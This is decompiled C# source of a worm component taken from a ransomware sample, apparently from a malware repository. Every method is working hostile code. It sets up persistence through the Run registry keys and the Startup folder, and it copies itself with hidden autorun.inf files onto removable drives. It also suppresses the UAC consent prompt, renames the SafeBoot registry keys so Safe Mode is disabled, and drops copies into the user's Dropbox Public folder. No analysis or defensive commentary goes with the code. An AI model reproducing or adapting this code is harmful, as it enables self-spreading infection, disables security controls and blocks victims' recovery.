// Decompiled with JetBrains decompiler
// Type: WormAction
// Assembly: Handyware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79A15AC7-DE29-40AC-9E7A-1719C725BB8B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.dizu-68e906811b2a0a3f0f264be4966fee8440ac83cc6a06bae2c47bdbf43e5284bc.exe

using Handyware;
using Microsoft.Win32;
using System;
using System.IO;
using System.Text;

internal class WormAction
{
  private string WorkspacePath;
  private string CurrentApplicationPath;
  private string dropboxPublicPath;
  private string logPath;

  private byte[] getBytesOfFile(string filePath)
  {
    FileStream input = new FileStream(filePath, FileMode.Open, FileAccess.Read);
    BinaryReader binaryReader = new BinaryReader((Stream) input);
    byte[] bytesOfFile = binaryReader.ReadBytes(Convert.ToInt32(new FileInfo(filePath).Length));
    binaryReader.Close();
    input.Close();
    return bytesOfFile;
  }

  private void writeLog(string text)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(this.logPath, true);
      streamWriter.WriteLine(text);
      streamWriter.Write("\r\n\r\n");
      streamWriter.Close();
    }
    catch
    {
    }
  }

  public WormAction(string ProgramWorkspacePath, string CompleteApplicationPath, string log_path)
  {
    this.WorkspacePath = ProgramWorkspacePath;
    this.CurrentApplicationPath = CompleteApplicationPath;
    this.dropboxPublicPath = "";
    this.logPath = log_path;
  }

  public string SetStartupON(string RegistryKeyName, string CompletFileName2Startup)
  {
    try
    {
      if (!File.Exists(this.WorkspacePath + "\\" + CompletFileName2Startup))
        File.Copy(this.CurrentApplicationPath, this.WorkspacePath + "\\" + CompletFileName2Startup, false);
    }
    catch
    {
    }
    try
    {
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(RegistryKeyName, (object) (this.WorkspacePath + "\\" + CompletFileName2Startup));
      return "HKLM";
    }
    catch
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(RegistryKeyName, (object) (this.WorkspacePath + "\\" + CompletFileName2Startup));
        return "HKCU";
      }
      catch
      {
        try
        {
          File.Copy(this.CurrentApplicationPath, Environment.GetFolderPath(Environment.SpecialFolder.Startup).ToString() + "\\" + CompletFileName2Startup, true);
          File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup).ToString() + "\\" + CompletFileName2Startup, FileAttributes.Hidden);
          return "StartUp Folder";
        }
        catch
        {
        }
      }
    }
    return "No";
  }

  public string SetStartupON(string RegistryKeyName, string path2Startup, bool withouWorkspace)
  {
    try
    {
      if (!File.Exists(path2Startup))
        File.Copy(this.CurrentApplicationPath, path2Startup, false);
    }
    catch
    {
    }
    try
    {
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(RegistryKeyName, (object) path2Startup);
      return "HKLM";
    }
    catch
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(RegistryKeyName, (object) path2Startup);
        return "HKCU";
      }
      catch
      {
      }
    }
    return "No";
  }

  public bool CopyToFolder(string CompletePATHandFILENAME, bool OverWrite)
  {
    try
    {
      try
      {
        File.Delete(CompletePATHandFILENAME);
      }
      catch
      {
      }
      File.Copy(this.CurrentApplicationPath, CompletePATHandFILENAME, OverWrite);
      return true;
    }
    catch
    {
      return false;
    }
  }

  public bool CopyToFolder(string CompletePATHandFILENAME, bool OverWrite, bool hide)
  {
    try
    {
      try
      {
        File.Delete(CompletePATHandFILENAME);
      }
      catch
      {
      }
      File.Copy(this.CurrentApplicationPath, CompletePATHandFILENAME, OverWrite);
      if (hide)
        File.SetAttributes(CompletePATHandFILENAME, FileAttributes.Hidden);
      else
        File.SetAttributes(CompletePATHandFILENAME, FileAttributes.Normal);
      return true;
    }
    catch
    {
      return false;
    }
  }

  public void CopyToRemovableDevices(
    string FileCompleteNameOnRemovableDevice,
    bool HideFile,
    bool SetAutorun)
  {
    foreach (string logicalDrive in Environment.GetLogicalDrives())
    {
      try
      {
        if (!logicalDrive.Contains("c") && !logicalDrive.Contains("C"))
        {
          if (!File.Exists(logicalDrive + FileCompleteNameOnRemovableDevice))
          {
            File.Copy(this.CurrentApplicationPath, logicalDrive + FileCompleteNameOnRemovableDevice, true);
            if (HideFile)
              File.SetAttributes(logicalDrive + FileCompleteNameOnRemovableDevice, FileAttributes.Hidden);
            else
              File.SetAttributes(logicalDrive + FileCompleteNameOnRemovableDevice, FileAttributes.Normal);
            if (SetAutorun)
            {
              try
              {
                File.Delete(logicalDrive + "autorun.inf");
              }
              catch
              {
              }
              StreamWriter streamWriter = new StreamWriter(logicalDrive + "autorun.inf", false);
              streamWriter.WriteLine("[autorun]");
              streamWriter.WriteLine("open=" + FileCompleteNameOnRemovableDevice);
              streamWriter.Write("icon=" + FileCompleteNameOnRemovableDevice);
              streamWriter.Close();
              File.SetAttributes(logicalDrive + "autorun.inf", FileAttributes.Hidden);
            }
          }
          else if (Hash.SHA512(logicalDrive + FileCompleteNameOnRemovableDevice) != Hash.SHA512(this.CurrentApplicationPath))
          {
            File.Delete(logicalDrive + FileCompleteNameOnRemovableDevice);
            File.Copy(this.CurrentApplicationPath, logicalDrive + FileCompleteNameOnRemovableDevice, true);
            if (HideFile)
              File.SetAttributes(logicalDrive + FileCompleteNameOnRemovableDevice, FileAttributes.Hidden);
            else
              File.SetAttributes(logicalDrive + FileCompleteNameOnRemovableDevice, FileAttributes.Normal);
            if (SetAutorun)
            {
              try
              {
                File.Delete(logicalDrive + "autorun.inf");
              }
              catch
              {
              }
              StreamWriter streamWriter = new StreamWriter(logicalDrive + "autorun.inf", false);
              streamWriter.WriteLine("[autorun]");
              streamWriter.WriteLine("open=" + FileCompleteNameOnRemovableDevice);
              streamWriter.Write("icon=" + FileCompleteNameOnRemovableDevice);
              streamWriter.Close();
              File.SetAttributes(logicalDrive + "autorun.inf", FileAttributes.Hidden);
            }
          }
        }
      }
      catch
      {
      }
    }
  }

  public void removeUACRegistry()
  {
    try
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
      registryKey.SetValue("EnableLUA", (object) "00000001", RegistryValueKind.DWord);
      registryKey.SetValue("ConsentPromptBehaviorAdmin", (object) "00000000", RegistryValueKind.DWord);
    }
    catch
    {
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        registryKey.DeleteValue("EnableLUA");
        registryKey.DeleteValue("ConsentPromptBehaviorAdmin");
        registryKey.SetValue("EnableLUA", (object) "00000001", RegistryValueKind.DWord);
        registryKey.SetValue("ConsentPromptBehaviorAdmin", (object) "00000000", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        this.writeLog("Remove UAC\r\nError: " + ex.Message);
      }
    }
  }

  public void removeBootSafe()
  {
    try
    {
      RegistryKey parentKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot", true);
      string[] subKeyNames = parentKey.GetSubKeyNames();
      for (int index = 0; index < subKeyNames.Length; ++index)
        new regUtilities().RenameSubKey(parentKey, subKeyNames[index], subKeyNames[index] + "-");
    }
    catch (Exception ex)
    {
      this.writeLog("Remove BootSafe\r\nError: " + ex.Message);
    }
  }

  public void disableWindowsSearch()
  {
    try
    {
      Registry.LocalMachine.OpenSubKey("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", true).DeleteValue("Start_SearchFiles");
    }
    catch
    {
    }
  }

  public bool copyToDropbox(string fileName_inDropbox)
  {
    try
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dropbox\\config.db";
      if (!File.Exists(path))
        return false;
      try
      {
        if (!Directory.Exists(this.dropboxPublicPath))
        {
          StreamReader streamReader = new StreamReader(path, Encoding.UTF8);
          string end = streamReader.ReadToEnd();
          streamReader.Close();
          int startIndex = end.IndexOf("dropbox_path") + 12;
          int num = end.IndexOf("Dropbox", startIndex);
          this.dropboxPublicPath = "";
          for (int index = startIndex; index < num; ++index)
            this.dropboxPublicPath += (string) (object) end[index];
          this.dropboxPublicPath += "Dropbox\\Public\\";
          if (!Directory.Exists(this.dropboxPublicPath))
            return false;
        }
        File.Copy(this.CurrentApplicationPath, this.dropboxPublicPath + fileName_inDropbox, true);
        return true;
      }
      catch
      {
        return false;
      }
    }
    catch
    {
      return false;
    }
  }
}
